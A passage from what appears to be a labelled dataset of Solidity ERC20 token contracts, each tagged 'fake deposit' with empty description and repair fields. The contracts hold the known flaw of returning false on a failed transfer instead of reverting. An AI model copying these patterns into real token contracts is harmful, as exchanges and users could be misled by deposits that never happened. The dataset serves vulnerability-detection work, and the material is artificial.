        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n/// @return total amount of tokens\r\nfunction totalSupply() constant returns (uint256 supply) {}\r\n\r\n/// @param _owner The address from which the balance will be retrieved\r\n/// @return The balance\r\nfunction balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n/// @notice send `_value` token to `_to` from `msg.sender`\r\n/// @param _to The address of the recipient\r\n/// @param _value The amount of token to be transferred\r\n/// @return Whether the transfer was successful or not\r\nfunction transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n/// @param _from The address of the sender\r\n/// @param _to The address of the recipient\r\n/// @param _value The amount of token to be transferred\r\n/// @return Whether the transfer was successful or not\r\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n/// @param _spender The address of the account able to transfer the tokens\r\n/// @param _value The amount of wei to be approved for transfer\r\n/// @return Whether the approval was successful or not\r\nfunction approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n/// @param _owner The address of the account owning tokens\r\n/// @param _spender The address of the account able to transfer the tokens\r\n/// @return Amount of remaining tokens allowed to spent\r\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\r\nevent Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\nfunction transfer(address _to, uint256 _value) returns (bool success) {\r\n//Default assumes totalSupply can't be over max (2^256 - 1).\r\n//If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n//Replace the if with this one instead.\r\n//if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\nif (balances[msg.sender] >= _value && _value > 0) {\r\nbalances[msg.sender] -= _value;\r\nbalances[_to] += _value;\r\nTransfer(msg.sender, _to, _value);\r\nreturn true;\r\n} else { return false; }\r\n}\r\n\r\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n//same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n//if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\nif (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\nbalances[_to] += _value;\r\nbalances[_from] -= _value;\r\nallowed[_from][msg.sender] -= _value;\r\nTransfer(_from, _to, _value);\r\nreturn true;\r\n} else { return false; }\r\n}\r\n\r\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\r\nreturn balances[_owner];\r\n}\r\n\r\nfunction approve(address _spender, uint256 _value) returns (bool success) {\r\nallowed[msg.sender][_spender] = _value;\r\nApproval(msg.sender, _spender, _value);\r\nreturn true;\r\n}\r\n\r\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\nreturn allowed[_owner][_spender];\r\n}\r\n\r\nmapping (address => uint256) balances;\r\nmapping (address => mapping (address => uint256)) allowed;\r\nuint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\nfunction () {\r\n//if ether is sent to this address, send it back.\r\nthrow;\r\n}\r\n\r\n/* Public variables of the token */\r\n\r\n/*\r\nNOTE:\r\nThe following variables are OPTIONAL vanities. One does not have to include them.\r\nThey allow one to customise the token contract & in no way influences the core functionality.\r\nSome wallets/interfaces might not even bother to look at this information.\r\n*/\r\nstring public name; //fancy name: eg Simon Bucks\r\nuint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\nstring public symbol; //An identifier: eg SBX\r\nstring public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\nfunction ERC20Token(\r\n) {\r\nbalances[msg.sender] = 1000; // Give the creator all initial tokens (100000 for example)\r\ntotalSupply = 1000; // Update total supply (100000 for example)\r\nname = \"Cryptogate\"; // Set the name for display purposes\r\ndecimals = 0; // Amount of decimals for display purposes\r\nsymbol = \"CG\"; // Set the symbol for display purposes\r\n}\r\n\r\n/* Approves and then calls the receiving contract */\r\nfunction approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\nallowed[msg.sender][_spender] = _value;\r\nApproval(msg.sender, _spender, _value);\r\n\r\n//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n//receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n//it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\nreturn true;\r\n}\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\ncontract Arzdigital {\r\n/// @return total amount of tokens\r\n function totalSupply() constant returns (uint256 supply) {}\r\n/// @param _owner The address from which the balance will be retrieved\r\n /// @return The balance\r\n function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n/// @notice send `_value` token to `_to` from `msg.sender`\r\n /// @param _to The address of the recipient\r\n /// @param _value The amount of token to be transferred\r\n /// @return Whether the transfer was successful or not\r\n function transfer(address _to, uint256 _value) returns (bool success) {}\r\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n /// @param _from The address of the sender\r\n /// @param _to The address of the recipient\r\n /// @param _value The amount of token to be transferred\r\n /// @return Whether the transfer was successful or not\r\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n /// @param _spender The address of the account able to transfer the tokens\r\n /// @param _value The amount of wei to be approved for transfer\r\n /// @return Whether the approval was successful or not\r\n function approve(address _spender, uint256 _value) returns (bool success) {}\r\n/// @param _owner The address of the account owning tokens\r\n /// @param _spender The address of the account able to transfer the tokens\r\n /// @return Amount of remaining tokens allowed to spent\r\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n \r\n}\r\ncontract StandardToken is Arzdigital {\r\nfunction transfer(address _to, uint256 _value) returns (bool success) {\r\n //Default assumes totalSupply can\u2019t be over max (2\u00b2\u2075\u2076 \u2014 1).\r\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn\u2019t wrap.\r\n //Replace the if with this one instead.\r\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n if (balances[msg.sender] >= _value && _value > 0) {\r\n balances[msg.sender] -= _value;\r\n balances[_to] += _value;\r\n Transfer(msg.sender, _to, _value);\r\n return true;\r\n } else { return false; }\r\n }\r\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n balances[_to] += _value;\r\n balances[_from] -= _value;\r\n allowed[_from][msg.sender] -= _value;\r\n Transfer(_from, _to, _value);\r\n return true;\r\n } else { return false; }\r\n }\r\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\r\n return balances[_owner];\r\n }\r\nfunction approve(address _spender, uint256 _value) returns (bool success) {\r\n allowed[msg.sender][_spender] = _value;\r\n Approval(msg.sender, _spender, _value);\r\n return true;\r\n }\r\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n return allowed[_owner][_spender];\r\n }\r\nmapping (address => uint256) balances;\r\n mapping (address => mapping (address => uint256)) allowed;\r\n uint256 public totalSupply;\r\n}\r\n//name this contract whatever you\u2019d like\r\ncontract Token is StandardToken {\r\nfunction () {\r\n //if ether is sent to this address, send it back.\r\n throw;\r\n }\r\n/* Public variables of the token */\r\n/*\r\n NOTE:\r\n The following variables are OPTIONAL vanities. One does not have to include them.\r\n They allow one to customise the token contract & in no way influences the core functionality.\r\n Some wallets/interfaces might not even bother to look at this information.\r\n */\r\n string public name; //fancy name: eg Simon Bucks\r\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It\u2019s like comparing 1 wei to 1 ether.\r\n string public symbol; //An identifier: eg SBX\r\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\r\n//\r\n// \u0628\u0631\u0627\u06cc \u062a\u0648\u06a9\u0646 \u062e\u0648\u062f \u0645\u0642\u062f\u0627\u0631\u0647\u0627\u06cc \u0632\u06cc\u0631 \u0631\u0627 \u062a\u063a\u06cc\u06cc\u0631 \u062f\u0647\u06cc\u062f\r\n//\r\n//make sure this function name matches the contract name above. So if you\u2019re token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\nfunction Token(\r\n ) {\r\n balances[msg.sender] = 1000000000000; // \u062a\u0645\u0627\u0645 \u062a\u0648\u06a9\u0646\u0647\u0627\u06cc \u0633\u0627\u062e\u062a\u0647 \u0634\u062f\u0647 \u0633\u0627\u0632\u0646\u062f\u0647 \u0628\u0631\u0633\u062f -\u0639\u062f\u062f\u06cc \u0648\u0627\u0631\u062f \u06a9\u0646\u06cc\u062f \u0645\u062b\u0644\u0627 100000\r\n totalSupply = 1000000000000; // \u062a\u0645\u0627\u0645 \u0639\u0631\u0636\u0647\r\n name = 'HAZEM & AMIR'; // \u0646\u0627\u0645 \u062a\u0648\u06a9\u0646\r\n decimals = 5; // \u0627\u0639\u0634\u0627\u0631\r\n symbol = 'HMR'; // \u0646\u0645\u0627\u062f \u062a\u0648\u06a9\u0646\r\n }\r\n/* Approves and then calls the receiving contract */\r\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n allowed[msg.sender][_spender] = _value;\r\n Approval(msg.sender, _spender, _value);\r\n//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn\u2019t have to include a contract in here just for this.\r\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n if(!_spender.call(bytes4(bytes32(sha3('receiveApproval(address,uint256,address,bytes)'))), msg.sender, _value, this, _extraData)) { throw; }\r\n return true;\r\n }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant public returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) view public returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) public returns (bool success) { return true; }\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) { return true;}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) public returns (bool success) { return true; }\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant public returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant public returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant public returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract Papillon is StandardToken {\r\n\r\n    function () public {\r\n        //if ether is sent to this address, send it back.\r\n        revert();\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    constructor() public {\r\n        balances[msg.sender] = 1000000000000000000000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 1000000000000000000000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"Papillon\";                                   // Set the name for display purposes\r\n        decimals = 18;                            // Amount of decimals for display purposes\r\n        symbol = \"PAPI\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 10000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 10000000000;                        // Update total supply (100000 for example)\r\n        name = \"Elonex\";                                   // Set the name for display purposes\r\n        decimals = 2;                            // Amount of decimals for display purposes\r\n        symbol = \"Elonex\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //uint256 _limit = .01*10000000000000000000;\r\n        // && _value <= _limit\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract BitSound is StandardToken {\r\n\r\n    function (){\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n    function BitSound() {\r\n        balances[msg.sender] = 3000000000000000000;\r\n        totalSupply = 1500000000000000000;\r\n        name = \"BitSound\";\r\n        decimals = 10;\r\n        symbol = \"NOISE\";\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.25;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n    \r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n     \r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract JapaneseSpitz is StandardToken { \r\n\r\n    /* Public variables of the token */\r\n\r\n    